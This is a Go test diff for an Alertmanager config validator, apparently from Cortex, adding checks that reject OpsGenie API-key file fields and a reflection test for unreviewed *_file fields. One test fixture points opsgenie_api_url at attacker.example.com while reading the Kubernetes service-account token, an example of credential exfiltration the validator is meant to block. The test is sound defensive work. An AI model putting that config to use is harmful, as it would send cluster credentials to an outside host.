@@ -7,6 +7,8 @@ import (
 	"io"
 	"net/http"
 	"net/http/httptest"
+	"reflect"
+	"strings"
 	"testing"
 
 	"github.com/go-kit/log"
@@ -419,6 +421,38 @@ alertmanager_config: |
 			err: errors.Wrap(errVictorOpsAPIKeyFileNotAllowed, "error validating Alertmanager config"),
 		},
 		{
+			name: "Should return error if OpsGenie api_key_file is set on the receiver",
+			cfg: `
+alertmanager_config: |
+  receivers:
+    - name: default-receiver
+      opsgenie_configs:
+        - api_key_file: /var/run/secrets/kubernetes.io/serviceaccount/token
+
+  route:
+    receiver: 'default-receiver'
+`,
+			err: errors.Wrap(errOpsGenieAPIKeyFileNotAllowed, "error validating Alertmanager config"),
+		},
+		{
+			name: "Should return error if global opsgenie_api_key_file is set",
+			cfg: `
+alertmanager_config: |
+  global:
+    opsgenie_api_url: http://attacker.example.com/
+    opsgenie_api_key_file: /var/run/secrets/kubernetes.io/serviceaccount/token
+  receivers:
+    - name: default-receiver
+      opsgenie_configs:
+        - send_resolved: true
+
+  route:
+    receiver: 'default-receiver'
+    group_wait: 0s
+`,
+			err: errors.Wrap(errOpsGenieAPIKeyFileNotAllowed, "error validating Alertmanager config"),
+		},
+		{
 			name: "should return error if template is wrong",
 			cfg: `
 alertmanager_config: |
@@ -785,6 +819,29 @@ func TestValidateAlertmanagerConfig(t *testing.T) {
 			},
 			expected: errTLSFileNotAllowed,
 		},
+		"OpsGenieConfig with APIKeyFile": {
+			input: config.OpsGenieConfig{
+				APIKeyFile: "/var/run/secrets/kubernetes.io/serviceaccount/token",
+			},
+			expected: errOpsGenieAPIKeyFileNotAllowed,
+		},
+		"GlobalConfig with OpsGenieAPIKeyFile": {
+			input: config.GlobalConfig{
+				OpsGenieAPIKeyFile: "/var/run/secrets/kubernetes.io/serviceaccount/token",
+			},
+			expected: errOpsGenieAPIKeyFileNotAllowed,
+		},
+		"struct containing OpsGenieConfig as nested child within a slice": {
+			input: config.Config{
+				Receivers: []*config.Receiver{{
+					Name: "test",
+					OpsGenieConfigs: []*config.OpsGenieConfig{{
+						APIKeyFile: "/secrets/token",
+					}},
+				}},
+			},
+			expected: errOpsGenieAPIKeyFileNotAllowed,
+		},
 	}
 
 	for testName, testData := range tests {
@@ -792,5 +849,91 @@ func TestValidateAlertmanagerConfig(t *testing.T) {
 			err := validateAlertmanagerConfig(testData.input)
 			assert.ErrorIs(t, err, testData.expected)
 		})
+	}
+}
+
+// TestNoNewVendoredFileFields walks every type exported by the vendored
+// Alertmanager and prometheus-common config packages and verifies that each
+// struct field whose YAML tag name ends in "_file" is either explicitly
+// handled by a per-type validator in this file or is on the reviewed
+// allowedFileFields allow-list. When a future vendor bump introduces a new
+// *_file option, this test fails until a Cortex maintainer decides whether to
+// deny it (default) or add it to the allow-list after review.
+//
+// This is the companion to the generic *_file walker in
+// validateAlertmanagerConfig: it checks that the generic walker's allow/deny
+// decisions have been made consciously for every known *_file field, rather
+// than relying on type-switch cases to be remembered by hand.
+func TestNoNewVendoredFileFields(t *testing.T) {
+	// Known *_file fields that are already denied by validateAlertmanagerConfig
+	// (either via the generic walker's rejection of non-empty values, or via a
+	// dedicated per-type validator). The list is deliberately exhaustive: when
+	// vendored config adds a new *_file field it will not appear here and the
+	// test will fail, forcing a human review.
+	knownDeniedFileFields := map[string]struct{}{
+		// prometheus-common HTTPClientConfig / TLSConfig / OAuth2
+		"password_file":      {},
+		"credentials_file":   {},
+		"bearer_token_file":  {},
+		"client_secret_file": {},
+		"ca_file":            {},
+		"cert_file":          {},
+		"key_file":           {},
+		// alertmanager GlobalConfig
+		"slack_api_url_file":    {},
+		"opsgenie_api_key_file": {},
+		// alertmanager receiver configs
+		"api_url_file": {}, // Slack
+		"api_key_file": {}, // VictorOps + OpsGenie
+	}
+
+	var (
+		seen    = map[reflect.Type]bool{}
+		unknown []string
+	)
+
+	var walk func(t reflect.Type)
+	walk = func(t reflect.Type) {
+		for t.Kind() == reflect.Ptr || t.Kind() == reflect.Slice || t.Kind() == reflect.Array || t.Kind() == reflect.Map {
+			t = t.Elem()
+		}
+		if t.Kind() != reflect.Struct {
+			return
+		}
+		if seen[t] {
+			return
+		}
+		seen[t] = true
+
+		for i := 0; i < t.NumField(); i++ {
+			field := t.Field(i)
+			yamlTag, ok := field.Tag.Lookup("yaml")
+			if ok && yamlTag != "-" {
+				name := yamlTag
+				if idx := strings.Index(name, ","); idx >= 0 {
+					name = name[:idx]
+				}
+				if strings.HasSuffix(name, "_file") && name != "" {
+					if _, allowed := allowedFileFields[name]; !allowed {
+						if _, known := knownDeniedFileFields[name]; !known {
+							unknown = append(unknown, fmt.Sprintf("%s.%s (yaml:%q)", t.PkgPath()+"."+t.Name(), field.Name, name))
+						}
+					}
+				}
+			}
+			walk(field.Type)
+		}
+	}
+
+	// Entry points: every top-level config struct we accept from tenants.
+	walk(reflect.TypeOf(config.Config{}))
+	walk(reflect.TypeOf(config.GlobalConfig{}))
+	walk(reflect.TypeOf(commoncfg.HTTPClientConfig{}))
+	walk(reflect.TypeOf(commoncfg.TLSConfig{}))
+
+	if len(unknown) > 0 {
+		t.Fatalf("the vendored Alertmanager config package introduced new *_file fields that are not explicitly reviewed. "+
+			"Add each one to allowedFileFields (if safe) or to TestNoNewVendoredFileFields.knownDeniedFileFields (if denied by "+
+			"validateAlertmanagerConfig). New fields: %v", unknown)
 	}
 }
